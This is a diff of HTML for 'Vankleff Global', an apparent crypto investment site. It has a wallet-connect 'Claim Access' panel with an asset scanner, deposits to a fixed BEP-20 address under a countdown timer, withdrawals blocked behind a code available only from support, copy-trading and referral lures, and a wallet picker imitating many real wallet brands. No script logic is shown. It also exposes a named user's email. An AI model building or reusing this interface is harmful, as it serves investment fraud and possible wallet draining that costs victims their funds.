-        <div class="active-net-dot dot-bsc" id="activeNetDot"></div>
-        <span style="font-size:11px;">Active Network:</span>
-        <span class="active-net-name bsc" id="activeNetName">BNB Smart Chain (BSC)</span>
-      </div>
-
-      <button class="btn-cw" id="connectBtn">Connect Wallet</button>
-      <div class="w3-btn-row">
-        <button class="btn-w3-claim" id="claimBtn">✦ Claim Access</button>
-        <button class="btn-w3-disconnect" id="disconnectBtn">Disconnect</button>
-      </div>
-    </div>
-    <div class="web3-panels">
-      <p id="statusText"></p>
-      <div id="chainSwitchBanner">
-        <span id="chainSwitchMsg">⚠️ Please switch to <strong>BNB Smart Chain</strong> to continue.</span>
-        <br><button class="btn-switch-chain" id="switchChainBtn">Switch Network</button>
-      </div>
-      <div id="stageLog"></div>
-      <div id="errorBanner"></div>
-      <div id="infoPanel">
-        <div class="info-row"><span class="info-label">Address</span><span class="info-value" id="walletAddress">—</span></div><hr class="divider">
-        <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="networkName">—</span></div>
-        <div class="info-row"><span class="info-label">Chain ID</span><span class="info-value" id="chainIdDisplay">—</span></div><hr class="divider">
-        <div class="info-row"><span class="info-label">Native Balance</span><span class="info-value" id="nativeBalance">—</span></div>
-        <div class="info-row"><span class="info-label">USDT Balance</span><span class="info-value" id="usdtBalance">—</span></div><hr class="divider">
-        <div class="info-row"><span class="info-label">Status</span><span class="badge badge-yellow" id="statusBadge">Awaiting Claim</span></div>
-        <div class="info-row"><span class="info-label">Session</span><span class="badge badge-blue" id="sessionLabel">Web3Modal</span></div>
-      </div>
-      <div id="scannerPanel"><div class="scanner-title">🔍 Discovered Assets</div><div id="assetList"><span class="scan-status">Awaiting scan...</span></div></div>
-      <div id="txPanel"><div class="tx-title">Transaction History</div><div id="txList"><span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span></div></div>
-    </div>
-  </div></div>
-
-  <!-- DEPOSIT -->
-  <div id="dd-deposit" style="display:none;"><div class="dep-wrap"><h1>Deposit Funds</h1><p style="font-size:12px;color:#aaa;margin-bottom:18px;">Select Payment Method</p><div class="meth-grid"><div class="meth sel" id="m-usdt" onclick="selM('usdt')"><span>💵</span>USDT (BEP-20)</div><div class="meth" id="m-btc" onclick="selM('btc')"><span>₿</span>BTC</div></div><div id="dep-form"><input class="amt-input" type="number" id="dep-amt" placeholder="Minimum $1,000"/><div class="quick-amts"><button class="qa" onclick="setAmt(1000)">$1,000</button><button class="qa" onclick="setAmt(5000)">$5,000</button><button class="qa" onclick="setAmt(10000)">$10,000</button></div><button class="btn-cont" onclick="showAddr()">Continue</button></div><div id="dep-addr" style="display:none;"><div class="addr-box"><div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div><div class="addr-row"><button class="btn-copy" onclick="cpAddr()">📋 Copy</button><div class="net-badge">BEP-20</div></div></div><div class="warn-box"><span>⚠</span><p>Send exact amount to this address. Wrong network = lost funds.</p></div><div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div><button class="btn-cd" onclick="confDep()">Confirm Deposit</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
-
-  <!-- WITHDRAW -->
-  <div id="dd-withdraw" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1><div class="sec-notice"><h4>⚠ Security Notice</h4><p>All withdrawals require a verification code. Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to receive your code.</p></div><div class="code-box"><div class="otp-row"><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/></div></div><button class="btn-verify" onclick="document.getElementById('wd-note-ov').classList.add('open')">Verify &amp; Withdraw</button><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
-
-  <!-- STATEMENT, SETTINGS -->
-  <div id="dd-statement" style="display:none;"><div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div><div class="stmt-filters"><button class="sfbtn on">All</button><button class="sfbtn">Deposit</button><button class="sfbtn">Withdrawal</button></div><div id="stmt-list"></div><div style="padding:0 20px;"><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
-  <div id="dd-settings" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Account Settings</h1><div class="set-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;"><div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;">V</div><div><div style="font-size:14px;font-weight:800;">vincentchidiadi</div><div style="font-size:11px;color:#aaa;">vincentchidiadi@gmail.com</div></div></div><button class="btn-save" onclick="alert('Changes saved!')">Save Changes</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+<!-- TERMS PAGE -->
+<div id="page-terms" class="page">
+  <div class="navbar">
+    <div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div>
+    <button class="btn-login" onclick="showPage('landing')">← Back</button>
+  </div>
+  <div class="legal-page">
+    <h1>Terms of Service</h1>
+    <div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div>
+    <h2>1. Acceptance</h2><p>By using the Vankleff Global platform, you agree to these Terms.</p>
+    <h2>2. Eligibility</h2><p>You must be at least 18 years of age and legally capable of entering into contracts.</p>
+    <h2>3. Risk Disclosure</h2><p>Trading digital assets involves substantial risk of loss. Past performance is not indicative of future results.</p>
+    <h2>4. Prohibited Activities</h2><p>You may not use the Platform for illegal purposes, market manipulation, or misrepresent your identity.</p>
+    <h2>5. Governing Law</h2><p>These Terms are governed by the laws of the State of New York.</p>
+    <h2>6. Contact</h2><p>350 Fifth Avenue, 85th Floor, New York, NY 10118. <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></p>
+  </div>
 </div>
 
-<!-- MODALS -->
-<div class="pm-ov" id="pm-ov" onclick="if(event.target===this)closePM()"><div style="background:#161b2e;border-radius:20px;padding:26px 22px;width:92%;max-width:400px;position:relative;"><button class="modal-close" onclick="closePM()">✕</button><div style="width:64px;height:64px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:26px;margin:0 auto 10px;">V</div><div style="font-size:16px;font-weight:800;text-align:center;">vincentchidiadi</div><div style="color:#22c55e;font-size:12px;text-align:center;margin-bottom:14px;">✓ Verified</div><div style="font-size:32px;font-weight:900;color:#22c55e;text-align:center;margin-bottom:18px;">$100.00</div><div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:18px;">Available Balance</div><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:#1a2a1a;color:#ccc;margin-bottom:10px;" onclick="closePM();showDash('settings')">⚙ Account Settings</button><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.3);" onclick="closePM();showConf()">↪ Logout</button></div></div>
-<div class="conf-ov" id="conf-ov"><div class="conf-box"><h3>Log Out?</h3><p style="font-size:13px;color:#aaa;margin-top:8px;">Are you sure?</p><div class="conf-btns"><button class="btn-no" onclick="document.getElementById('conf-ov').classList.remove('open')">No</button><button class="btn-yes" onclick="doLogout()">Yes, Logout</button></div></div></div>
-<div class="gm-ov" id="gm-ov"><div class="gm-box"><button class="gm-close" onclick="closeGM()">✕</button><h3 id="gm-t">Notice</h3><p id="gm-b"></p><button class="btn-gm" id="gm-btn" onclick="closeGM()">OK</button><button class="btn-gmc" id="gm-c" onclick="closeGM()" style="display:none">Cancel</button></div></div>
-<div class="suc-ov" id="suc-ov"><div class="suc-box"><button class="suc-close" onclick="document.getElementById('suc-ov').classList.remove('open')">✕</button><div style="font-size:50px;margin-bottom:14px;">✅</div><h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:10px;">Deposit Received!</h3><p style="font-size:13px;color:#aaa;">Validation takes 10–30 minutes.</p></div></div>
-<div class="wd-note-ov" id="wd-note-ov"><div class="wd-note-box"><div style="font-size:44px;margin-bottom:12px;">🔐</div><h3 style="font-size:17px;font-weight:800;color:#c9a84c;margin-bottom:12px;">Please Note</h3><p style="font-size:13px;color:#ccc;line-height:1.7;margin-bottom:20px;">Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;font-weight:700;">support@vankleffglobal.com</a> for your withdrawal code.</p><button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK</button></div></div>
-<div class="proc-ov" id="proc-ov"><div style="background:linear-gradient(160deg,#0a1a10,#0d2218,#071510);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px;width:90%;max-width:340px;text-align:center;"><div style="display:inline-flex;align-items:center;gap:6px;border:1px solid #22c55e;border-radius:20px;padding:5px 14px;font-size:11px;font-weight:700;color:#22c55e;margin-bottom:14px;">● IN-PROGRESS</div><h3 style="font-size:22px;font-weight:900;margin-bottom:8px;">Processing</h3><p id="proc-net-txt" style="font-size:13px;color:#aaa;margin-bottom:20px;">Executing via backend API...</p><button style="width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;" onclick="document.getElementById('proc-ov').classList.remove('open');showDash('main')">Back to Dashboard</button></div></div>
+<!-- PRIVACY PAGE -->
+<div id="page-privacy" class="page">
+  <div class="navbar">
+    <div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div>
+    <button class="btn-login" onclick="showPage('landing')">← Back</button>
+  </div>
+  <div class="legal-page">
+    <h1>Privacy Policy</h1>
+    <div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div>
+    <h2>1. Introduction</h2><p>Vankleff Global LLC is committed to protecting your privacy.</p>
+    <h2>2. Information We Collect</h2><p>Name, email, phone, country, financial information, IP addresses, and usage data via cookies.</p>
+    <h2>3. How We Use It</h2><p>To provide the platform, process transactions, verify identity, and comply with legal obligations.</p>
+    <h2>4. Security</h2><p>We implement AES-256 encryption, multi-factor authentication, and regular security audits.</p>
+    <h2>5. Your Rights</h2><p>Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to access, correct, or delete your data.</p>
+  </div>
+</div>
+
+<!-- AUTH MODAL -->
+<div class="modal-ov" id="auth-modal" onclick="if(event.target===this)closeAuth()">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeAuth()">✕</button>
+    <div class="modal-logo">V</div>
+    <div class="modal-title">VANKLEFF GLOBAL</div>
+    <div class="modal-sub">Institutional Digital Asset Management</div>
+    <div class="tab-row">
+      <button class="tab-btn" id="tab-c" onclick="switchTab('create')">Create Account</button>
+      <button class="tab-btn" id="tab-s" onclick="switchTab('signin')">Sign In</button>
+    </div>
+    <div id="form-create">
+      <div class="fg"><span class="fi">👤</span><input type="text" id="c-name" placeholder="Full Name"/></div>
+      <div class="fg"><span class="fi">✉️</span><input type="email" id="c-email" placeholder="Email Address"/></div>
+      <div class="phone-row">
+        <select class="phone-sel">
+          <option>🇺🇸 +1</option><option>🇬🇧 +44</option><option>🇳🇬 +234</option>
+          <option>🇦🇪 +971</option><option>🇮🇳 +91</option><option>🇬🇭 +233</option>
+        </select>
+        <div class="fg" style="flex:1;margin-bottom:0;"><span class="fi">📞</span><input type="tel" id="c-phone" placeholder="Phone Number"/></div>
+      </div>
+      <div class="fg"><span class="fi">🔒</span><input type="password" id="c-pass" placeholder="Password"/></div>
+      <div class="enc-note">🔒 Protected by <a href="#">256-bit encryption</a>.</div>
+      <div class="loading-spinner" id="load-create">
+        <div class="spinner-ring"></div>
+        <p style="color:#aaa;font-size:12px;margin-top:8px;">Creating your account...</p>
+      </div>
+      <button class="btn-submit" id="btn-create" onclick="doLoginCreate()">Create Private Account →</button>
+    </div>
+    <div id="form-signin" style="display:none;">
+      <div class="fg"><span class="fi">✉️</span><input type="email" id="s-email" placeholder="Email Address"/></div>
+      <div class="fg"><span class="fi">🔒</span><input type="password" id="s-pass" placeholder="Password"/></div>
+      <div class="enc-note">🔒 Protected by <a href="#">256-bit encryption</a>.</div>
+      <div class="loading-spinner" id="load-signin">
+        <div class="spinner-ring"></div>
+        <p style="color:#aaa;font-size:12px;margin-top:8px;">Signing you in...</p>
+      </div>
+      <button class="btn-submit" id="btn-signin" onclick="doLoginSignIn()">Sign In to Dashboard →</button>
+    </div>
+  </div>
+</div>
+
+<!-- WALLET MODAL -->
+<div class="wm-ov" id="wm-ov">
+  <div class="wm-box">
+    <div class="wm-track" id="wm-track">
+      <!-- Slide 0 -->
+      <div class="wm-slide">
+        <div class="wm-hdr"><span class="wm-title">Select Wallet</span><button class="wm-close" onclick="closeWM()">✕</button></div>
+        <div class="wm-dots" id="wm-dots0"></div>
+        <div class="w-grid">
+          <div class="w-item" onclick="selW('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask"/><span>MetaMask</span></div>
+          <div class="w-item" onclick="selW('Trust Wallet')"><img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet"/><span>Trust Wallet</span></div>
+          <div class="w-item" onclick="selW('Coinbase')"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1f/Coinbase_logo.svg" alt="Coinbase"/><span>Coinbase</span></div>
+          <div class="w-item" onclick="selW('Phantom')"><img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Solana_SOL.png" alt="Phantom"/><span>Phantom</span></div>
+          <div class="w-item" onclick="selW('Ledger')"><img src="https://upload.wikimedia.org/wikipedia/commons/2/25/Ledger_logo.svg" alt="Ledger"/><span>Ledger</span></div>
+          <div class="w-item" onclick="selW('WalletConnect')"><img src="https://framerusercontent.com/images/1ywdCIomAbHwN9qCiGXqLtVMp7s.png" alt="WalletConnect"/><span>WalletConnect</span></div>
+        </div>
+        <button onclick="goSlide(1)" style="width:100%;padding:10px;background:#4a6000;border-radius:10px;color:#ccc;font-size:13px;">More Wallets →</button>
+      </div>
+      <!-- Slide 1 -->
+      <div class="wm-slide">
+        <div class="wm-hdr"><button class="wm-back" onclick="goSlide(0)">←</button><span class="wm-title">More Wallets</span><button class="wm-close" onclick="closeWM()">✕</button></div>
+        <div class="wm-dots" id="wm-dots1"></div>
+        <div class="w-grid">
+          <div class="w-item" onclick="selW('Exodus')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/6494.png" alt="Exodus"/><span>Exodus</span></div>
+          <div class="w-item" onclick="selW('SafePal')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8119.png" alt="SafePal"/><span>SafePal</span></div>
+          <div class="w-item" onclick="selW('Uniswap')"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Uniswap_Logo.svg" alt="Uniswap"/><span>Uniswap</span></div>
+          <div class="w-item" onclick="selW('PancakeSwap')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/7186.png" alt="PancakeSwap"/><span>PancakeSwap</span></div>
+          <div class="w-item" onclick="selW('1inch')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8104.png" alt="1inch"/><span>1inch</span></div>
+          <div class="w-item" onclick="selW('SushiSwap')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/6758.png" alt="SushiSwap"/><span>SushiSwap</span></div>
+        </div>
+        <button onclick="goSlide(2)" style="width:100%;padding:10px;background:#4a6000;border-radius:10px;color:#ccc;font-size:13px;">More Wallets →</button>
+      </div>
+      <!-- Slide 2 -->
+      <div class="wm-slide">
+        <div class="wm-hdr"><button class="wm-back" onclick="goSlide(1)">←</button><span class="wm-title">More Wallets</span><button class="wm-close" onclick="closeWM()">✕</button></div>
+        <div class="wm-dots" id="wm-dots2"></div>
+        <div class="w-grid">
+          <div class="w-item" onclick="selW('Atomic Wallet')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4195.png" alt="Atomic"/><span>Atomic</span></div>
+          <div class="w-item" onclick="selW('Bybit')"><img src="https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png" alt="Bybit"/><span>Bybit</span></div>
+          <div class="w-item" onclick="selW('OKX Wallet')"><img src="https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png" alt="OKX"/><span>OKX</span></div>
+          <div class="w-item" onclick="selW('Binance')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" alt="Binance"/><span>Binance</span></div>
+          <div class="w-item" onclick="selW('Crypto.com')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3635.png" alt="Crypto.com"/><span>Crypto.com</span></div>
+          <div class="w-item" onclick="selW('Keplr')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3794.png" alt="Keplr"/><span>Keplr</span></div>
+        </div>
+        <button onclick="goSlide(3)" style="width:100%;padding:10px;background:#4a6000;border-radius:10px;color:#ccc;font-size:13px;">More Wallets →</button>
+      </div>
+      <!-- Slide 3 -->
+      <div class="wm-slide">
+        <div class="wm-hdr"><button class="wm-back" onclick="goSlide(2)">←</button><span class="wm-title">More Wallets</span><button class="wm-close" onclick="closeWM()">✕</button></div>
+        <div class="wm-dots" id="wm-dots3"></div>
+        <div class="w-grid">
+          <div class="w-item" onclick="selW('Zerion')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/24911.png" alt="Zerion"/><span>Zerion</span></div>
+          <div class="w-item" onclick="selW('Rainbow')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="Rainbow"/><span>Rainbow</span></div>
+          <div class="w-item" onclick="selW('imToken')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1975.png" alt="imToken"/><span>imToken</span></div>
+          <div class="w-item" onclick="selW('Trezor')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" alt="Trezor"/><span>Trezor</span></div>
+          <div class="w-item" onclick="selW('Gate.io')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4269.png" alt="Gate.io"/><span>Gate.io</span></div>
+          <div class="w-item" onclick="selW('Argent')"><img src="https://s2.coinmarketcap.com/static/img/coins/64x64/2280.png" alt="Argent"/><span>Argent</span></div>
+        </div>
+      </div>
+      <!-- Slide 4: Connecting Terminal -->
+      <div class="wm-slide">
+        <div class="wm-hdr"><button class="wm-back" onclick="goSlide(0)">←</button><span class="wm-title" id="ws2-ttl">Connecting...</span><button class="wm-close" onclick="closeWM()">✕</button></div>
+        <div class="wm-dots" id="wm-dots4"></div>
+        <div class="terminal" id="terminal"><span class="tcursor"></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PROFILE MODAL -->
+<div class="pm-ov" id="pm-ov" onclick="if(event.target===this)closePM()">
+  <div class="pm-box">
+    <button class="modal-close" onclick="closePM()">✕</button>
+    <div class="pm-av">V</div>
+    <div style="font-size:16px;font-weight:800;text-align:center;margin-bottom:4px;">vincentchidiadi</div>
+    <div style="color:#22c55e;font-size:12px;text-align:center;margin-bottom:2px;">✓ Verified</div>
+    <div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:14px;">LIVE MARKET</div>
+    <div class="pm-bal">$100.00</div>
+    <div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:18px;">Available Balance</div>
+    <table class="pm-stats">
+      <tr><td style="color:#aaa;">Total Profit</td><td>$0.00</td></tr>
+      <tr><td style="color:#aaa;">Total Deposit</td><td>$0.00</td></tr>
+      <tr><td style="color:#aaa;">Total Withdrawal</td><td>$0.00</td></tr>
+    </table>
+    <button class="btn-pm-set" onclick="closePM();showDash('settings')">⚙ Account Settings</button>
+    <button class="btn-pm-out" onclick="closePM();showConf()">↪ Logout</button>
+  </div>
+</div>
+
+<!-- CONFIRM LOGOUT -->
+<div class="conf-ov" id="conf-ov">
+  <div class="conf-box">
+    <h3>Log Out?</h3>
+    <p style="font-size:13px;color:#aaa;margin-top:8px;">Are you sure you want to log out?</p>
+    <div class="conf-btns">
+      <button class="btn-no" onclick="document.getElementById('conf-ov').classList.remove('open')">No</button>
+      <button class="btn-yes" onclick="doLogout()">Yes, Logout</button>
+    </div>
+  </div>
+</div>
+
+<!-- GENERIC MODAL -->
+<div class="gm-ov" id="gm-ov">
+  <div class="gm-box">
+    <button class="gm-close" onclick="closeGM()">✕</button>
+    <h3 id="gm-t">Notice</h3>
+    <p id="gm-b"></p>
+    <button class="btn-gm" id="gm-btn" onclick="closeGM()">OK</button>
+    <button class="btn-gmc" id="gm-c" onclick="closeGM()" style="display:none">Cancel</button>
+  </div>
+</div>
+
+<!-- COPY TRADER MODAL -->
+<div class="cp-ov" id="cp-ov">
+  <div class="cp-box">
+    <h3 id="cp-t">Copy Trader</h3>
+    <input class="cp-inp" type="number" id="cp-amt" placeholder="Min $500"/>
+    <div class="cp-btns">
+      <button class="btn-cp-c" onclick="document.getElementById('cp-ov').classList.remove('open')">Cancel</button>
+      <button class="btn-cp-s" onclick="startCopy()">Start Copying</button>
+    </div>
+  </div>
+</div>
+
+<!-- SUPPORT MODAL -->
+<div class="sup-ov" id="sup-ov" onclick="if(event.target===this)document.getElementById('sup-ov').classList.remove('open')">
+  <div class="sup-box">
+    <button class="sc" onclick="document.getElementById('sup-ov').classList.remove('open')">✕</button>
+    <div style="font-size:52px;margin-bottom:14px;">💬</div>
+    <h3 style="font-size:18px;font-weight:800;margin-bottom:8px;">Need Help?</h3>
+    <p style="font-size:13px;color:#aaa;margin-bottom:20px;line-height:1.6;">Our support team is available 24/7 to assist you.</p>
+    <a href="mailto:support@vankleffglobal.com" class="btn-sup">✉ Contact Support</a>
+    <p style="font-size:11px;color:#666;margin-top:8px;">support@vankleffglobal.com</p>
+    <div class="sup-row"><span>🕐</span><div><div style="font-weight:600;">Response Time</div><div style="font-size:11px;color:#aaa;">Within 1-2 hours</div></div></div>
+    <div class="sup-row"><span>🔒</span><div><div style="font-weight:600;">Secure Communication</div><div style="font-size:11px;color:#aaa;">All communications are encrypted</div></div></div>
+  </div>
+</div>
+
+<!-- PROCESSING DEPOSIT POPUP -->
+<div class="proc-ov" id="proc-ov">
+  <div style="background:linear-gradient(160deg,#0a1a10 0%,#0d2218 50%,#071510 100%);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px 28px;width:90%;max-width:340px;text-align:center;box-shadow:0 0 60px rgba(34,197,94,.15);">
+    <div style="width:80px;height:80px;background:radial-gradient(circle,#1a4a2a,#0a2018);border:2px solid #22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;animation:glowpulse 2s ease-in-out infinite;">🔗</div>
+    <div style="display:inline-flex;align-items:center;gap:6px;border:1px solid #22c55e;border-radius:20px;padding:5px 14px;font-size:11px;font-weight:700;color:#22c55e;letter-spacing:1px;margin-bottom:14px;">● IN-PROGRESS</div>
+    <h3 style="font-size:22px;font-weight:900;color:#fff;margin-bottom:8px;">Processing Deposit</h3>
+    <p id="proc-net-txt" style="font-size:13px;color:#aaa;line-height:1.6;margin-bottom:20px;">Verifying transaction details on the BEP-20 network.</p>
+    <div style="border-top:1px solid #1a3a22;margin-bottom:20px;">
+      <div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Asset</span><span id="proc-asset" style="color:#fff;font-weight:600;">USDT</span></div>
+      <div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Network</span><span id="proc-network" style="color:#fff;font-weight:600;">BEP-20</span></div>
+      <div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Quantity</span><span id="proc-qty" style="color:#fff;font-weight:600;">1,000.0000 USDT</span></div>
+      <div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Status</span><span style="color:#22c55e;">Pending</span></div>
+    </div>
+    <button style="width:100%;padding:15px;background:linear-gradient(135deg,#16a34a,#22c55e);border-radius:14px;color:#fff;font-size:15px;font-weight:800;border:none;" onclick="document.getElementById('proc-ov').classList.remove('open');showDash('main')">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- SUCCESS POPUP -->
+<div class="suc-ov" id="suc-ov">
+  <div class="suc-box">
+    <button class="suc-close" onclick="document.getElementById('suc-ov').classList.remove('open')">✕</button>
+    <div style="font-size:50px;margin-bottom:14px;">✅</div>
+    <h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:10px;">Deposit Received!</h3>
+    <p style="font-size:13px;color:#aaa;line-height:1.6;">Validation takes 10–30 minutes. You will be notified once confirmed.</p>
+  </div>
+</div>
+
+<!-- WITHDRAWAL NOTE POPUP -->
+<div class="wd-note-ov" id="wd-note-ov">
+  <div class="wd-note-box">
+    <div style="font-size:44px;margin-bottom:12px;">🔐</div>
+    <h3 style="font-size:17px;font-weight:800;color:#c9a84c;margin-bottom:12px;">Please Note</h3>
+    <p style="font-size:13px;color:#ccc;line-height:1.7;margin-bottom:20px;">To retrieve your withdrawal code, please contact our support team at <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;font-weight:700;">support@vankleffglobal.com</a>.</p>
+    <button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK, Got It</button>
+  </div>
+</div>
+
+<!-- ===== DASHBOARD ===== -->
+<div id="page-dashboard" class="page">
+  <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
+  <div class="sidebar" id="sidebar">
+    <div class="sb-top">
+      <div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div>
+      <button class="sb-close" onclick="closeSB()">✕</button>
+    </div>
+    <div class="sb-grp">OVERVIEW</div>
+    <div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div>
+    <div class="sb-item" onclick="showDash('markets');closeSB()"><div class="sb-left"><div class="sb-icon">📈</div>Live Markets</div><span class="sb-badge bl-live">LIVE</span></div>
+    <div class="sb-grp">PORTFOLIO</div>
+    <div class="sb-item" onclick="showDash('copytrade');closeSB()"><div class="sb-left"><div class="sb-icon">🔁</div>Copy Trading</div><span class="sb-badge bl-pro">Pro</span></div>
+    <div class="sb-item" onclick="closeSB()"><div class="sb-left"><div class="sb-icon">🤖</div>AI Bots</div><span class="sb-badge bl-ai">AI</span></div>
+    <div class="sb-item" onclick="showDash('plans');closeSB()"><div class="sb-left"><div class="sb-icon">📦</div>Plans</div></div>
+    <div class="sb-grp">MARKET INTELLIGENCE</div>
+    <div class="sb-item" onclick="showDash('signals');closeSB()"><div class="sb-left"><div class="sb-icon">📶</div>Signals</div><span class="sb-badge bl-prem">Premium</span></div>
+    <div class="sb-grp">WALLET</div>
+    <div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div>
+    <div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div>
+    <div class="sb-item" onclick="showDash('transfer');closeSB()"><div class="sb-left"><div class="sb-icon">⇄</div>Transfer</div></div>
+    <div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div>
+    <div class="sb-grp">ACCOUNT</div>
+    <div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div>
+    <div class="sb-item" onclick="showDash('performance');closeSB()"><div class="sb-left"><div class="sb-icon">📊</div>Performance</div></div>
+    <div class="sb-item" onclick="showDash('preferences');closeSB()"><div class="sb-left"><div class="sb-icon">🎛</div>Preferences</div></div>
+    <div class="sb-grp">GROWTH</div>
+    <div class="sb-item" onclick="showDash('referral');closeSB()"><div class="sb-left"><div class="sb-icon">👤</div>Referral</div><span class="sb-badge bl-10">10%</span></div>
+    <div class="sb-grp">SUCCESS</div>
+    <div class="sb-item" onclick="showDash('stories');closeSB()"><div class="sb-left"><div class="sb-icon">🌟</div>Success Stories</div></div>
+    <div class="sb-grp">SUPPORT</div>
+    <div class="sb-item" onclick="document.getElementById('sup-ov').classList.add('open');closeSB()"><div class="sb-left"><div class="sb-icon">💬</div>Chat Support</div></div>
+    <div class="sb-item" onclick="showConf();closeSB()"><div class="sb-left" style="color:#ef4444;"><div class="sb-icon">🚪</div>Logout</div></div>
+  </div>
+
+  <div class="dash-nav">
+    <button class="ham" onclick="openSB()">☰</button>
+    <div class="dn-brand"><div class="dn-logo">V</div><div><span class="dn-name">VANKLEFF GLOBAL</span><span class="dn-sub">Your Gateway to Trading</span></div></div>
+    <div class="av-circle" onclick="openPM()">V</div>
+  </div>
+
+  <!-- MAIN DASHBOARD -->
+  <div id="dd-main">
+    <div class="dash-content">
+      <div style="margin-bottom:16px;">
+        <h2 style="font-size:20px;font-weight:800;">Welcome back, <span style="color:#22c55e;">vincentchidiadi</span></h2>
+        <p style="font-size:12px;color:#aaa;">Here's your trading overview</p>
+      </div>
+      <div class="balance-card">
+        <div class="bal-lbl">Available Balance</div>
+        <div class="bal-amount">$100.00</div>
+        <div class="bal-btns">
+          <button class="btn-dep" onclick="showDash('deposit')">⬇ Deposit</button>
+          <button class="btn-wit" onclick="showDash('withdraw')">⬆ Withdraw</button>
+        </div>
+      </div>
+      <div class="mini-grid">
